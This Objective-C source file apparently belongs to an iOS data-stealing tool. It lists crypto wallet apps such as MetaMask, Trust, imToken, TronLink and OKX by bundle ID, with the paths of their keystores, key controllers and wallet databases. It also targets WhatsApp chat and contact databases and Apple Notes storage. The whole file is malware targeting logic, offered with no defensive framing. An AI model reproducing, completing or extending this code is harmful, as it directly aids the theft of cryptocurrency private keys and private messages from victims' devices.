#import "WQLTargets.h"

@implementation WQLTarget

- (BOOL)matchesBundleID:(NSString *)bundleID {
    if (!bundleID.length) return NO;
    NSString *lower = bundleID.lowercaseString;

    for (NSString *bid in self.bundleIDs) {
        if ([bid.lowercaseString isEqualToString:lower]) return YES;
    }
    for (NSString *f in self.fuzzyIDs) {
        if ([lower containsString:f.lowercaseString]) return YES;
    }
    return NO;
}

@end

@implementation WQLTargets

+ (WQLTarget *)target:(NSString *)name
            bundleIDs:(NSArray<NSString *> *)ids
             fuzzyIDs:(NSArray<NSString *> *)fuzzy
                paths:(NSArray<NSString *> *)paths
       wholeContainer:(BOOL)whole {
    WQLTarget *t = [WQLTarget new];
    t.name = name;
    t.bundleIDs = ids;
    t.fuzzyIDs = fuzzy;
    t.relativePaths = paths;
    t.wholeContainer = whole;
    return t;
}

+ (NSArray<WQLTarget *> *)wallets {
    return @[
        [self target:@"TronLink"
           bundleIDs:@[@"com.tronlink.hdwallet", @"com.tronlink.wallet"]
            fuzzyIDs:@[@"tronlink"]
               paths:@[@"Documents/TronLinkData.sqlite", @"Documents/keystore"]
      wholeContainer:NO],

        [self target:@"TokenPocket"
           bundleIDs:@[@"vip.mytokenpocket", @"pro.tokenpocket.tp",
                       @"com.tokenpocket.ios", @"com.global.wallet.ios"]
            fuzzyIDs:@[@"tokenpocket", @"mytokenpocket"]
               paths:@[@"Documents/db/main.sqlite3", @"Documents/F4SeCyr", @"Documents/walletsV2"]
      wholeContainer:NO],

        [self target:@"imToken"
           bundleIDs:@[@"im.token.app", @"im.token", @"imtoken"]
            fuzzyIDs:@[@"im.token", @"imtoken"]
               paths:@[@"Library/Application Support/im.token.app"]
      wholeContainer:NO],

        [self target:@"Trust"
           bundleIDs:@[@"com.sixdays.trust", @"com.wallet.crypto.trustapp"]
            fuzzyIDs:@[@"sixdays.trust", @"trustapp", @"trust.wallet"]
               paths:@[@"Documents/temp-cloud-keystore",
                       @"Library/Preferences/com.sixdays.trust.plist"]
      wholeContainer:NO],

        [self target:@"MetaMask"
           bundleIDs:@[@"io.metamask.MetaMask"]
            fuzzyIDs:@[@"metamask"]
               paths:@[@"Documents/persistStore/persist-KeyringController",
                       @"Documents/persistStore/persist-AccountsController"]
      wholeContainer:NO],

        [self target:@"OKX"
           bundleIDs:@[@"com.okex.OKExAppstoreFull", @"com.okex.okexwallet", @"com.okex.okex",
                       @"com.okex.wallet", @"com.okx.okx", @"com.okx.wallet", @"com.okx.app",
                       @"com.okinc.okex", @"com.okcoin.okex", @"com.okcoin.app", @"org.okx.ios"]
            fuzzyIDs:@[@"okx", @"okex", @"okcoin", @"okinc"]
               paths:@[@"Documents/wallet"]
      wholeContainer:NO],

        [self target:@"Bitpie"
           bundleIDs:@[@"com.bitpie.wallet"]
            fuzzyIDs:@[@"bitpie"]
               paths:@[@"Library/Preferences/com.bitpie.wallet.plist"]
      wholeContainer:YES],
    ];
}

+ (NSArray<WQLTarget *> *)extras {
    return @[
        [self target:@"WhatsApp"
           bundleIDs:@[@"net.whatsapp.WhatsApp", @"net.whatsapp.WhatsAppSMB"]
            fuzzyIDs:@[]
               paths:@[@"Documents/ChatStorage.sqlite", @"Documents/ContactsV2.sqlite"]
      wholeContainer:NO],

        [self target:@"Notes"
           bundleIDs:@[@"group.com.apple.notes"]
            fuzzyIDs:@[@"group.com.apple.notes"]
               paths:@[@"NoteStore.sqlite"]
      wholeContainer:NO],
    ];
}

+ (WQLTarget *)matchBundleID:(NSString *)bundleID inTargets:(NSArray<WQLTarget *> *)targets {
    if (!bundleID.length) return nil;
    for (WQLTarget *t in targets) {
        if ([t matchesBundleID:bundleID]) return t;
    }
    return nil;
}

@end